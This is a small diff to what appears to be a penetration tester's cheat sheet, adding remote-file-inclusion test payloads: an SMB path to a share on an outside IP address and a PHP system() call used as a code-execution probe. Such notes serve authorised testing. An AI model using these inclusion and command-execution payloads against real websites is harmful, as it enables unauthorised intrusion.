@@ -36,7 +36,12 @@ LFI
 ### RFI
 
 - smb
+
     =\\10.10.17.46\share\test.txt
+
+- testphp
+
+    <?php system("echo(RCE TEST);") ?>
 
 ### WordPress
 
